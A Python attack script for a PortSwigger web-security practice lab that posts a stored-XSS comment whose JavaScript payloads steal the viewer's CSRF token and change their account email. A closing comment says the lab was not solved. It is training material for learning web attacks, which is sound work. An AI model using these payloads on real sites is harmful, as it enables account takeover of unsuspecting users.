# Script for Portswigger lab "Exploiting XSS to bypass CSRF defenses"

import requests
from lxml import html
from rich.console import Console

console = Console()
session = requests.Session()

URL="https://0a2a00210466e1bc8302ab81008a004e.web-security-academy.net"
POST="/post?postId=10"
POST_COMMENT="/post/comment"
new_email = "foo1@example.com"
script1 = """<script>  
window.onload = () => {
const csrf = document.getElementsByTagName('form')[0].getElementsByTagName('input')[0].value;
fetch('https://0a2a00210466e1bc8302ab81008a004e.web-security-academy.net/my-account/change-email', {
method: 'POST',
body: `csrf=${csrf}&email=foo2@example.com`,
});  
}  
</script>
"""

script2 = """<script>
var req = new XMLHttpRequest(); // crea una request
req.onload = handleResponse; // gestisce la response
req.open('get','/my-account',true);
req.send();

function handleResponse() {
// prende il valore del token 'csrf’ della risposta HTTP in questione e lo salva nella variabile token: nota che la risposta viene inviata da chi visualizza la pagina dei commenti
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
// crea una nuova HTTP request
var changeReq = new XMLHttpRequest();

// istanzia la request come POST verso l’endpoint
changeReq.open('post', '/my-account/change-email', true);
// invia la POST request all’endpoint di cui sopra con il token csrf preso prima
changeReq.send('csrf='+token+'&email=ciao@test.com')
};
</script>
""".encode('utf-8')

def get_csrf_token(page_url):
    """Fetch CSRF token from a given page."""
    response = session.get(page_url)
    tree = html.fromstring(response.content)
    csrf_token = tree.xpath("//input[@name='csrf']/@value")
    return csrf_token[0] if csrf_token else None


def login(username, password):
    """Log in to the application."""
    csrf = get_csrf_token(f"{URL}/login")
    if not csrf:
        console.print("[red]CSRF token not found on login page[/red]")
        return False

    payload = {
        "csrf": csrf,
        "username": username,
        "password": password,
    }

    response = session.post(f"{URL}/login", data=payload)
    if response.status_code == 200:
        console.print("[green]Login successful[/green]")
        return True
    else:
        console.print("[red]Login failed[/red]")
        console.print(response.text)
        return False


def post_comment():
    csrf = get_csrf_token(f"{URL}{POST}")
    console.print(csrf)
    body = f"csrf={csrf}&postId=10&comment={script2}&name=ciao&email=test@example.com&website="
    res = session.post(f"{URL}{POST_COMMENT}", data=body)

    if res.status_code == 200:
        console.print("[green]Comment posted successfully[/green]")
        return True
    else:
        console.print("[red]Comment post failed[/red]")
        console.print(res.text)
        return False
    
with console.status("Logging..."):
    login("wiener", "peter")

with console.status("Posting a new comment..."):
    res = post_comment()

# CANNOT SOLVE THIS LAB!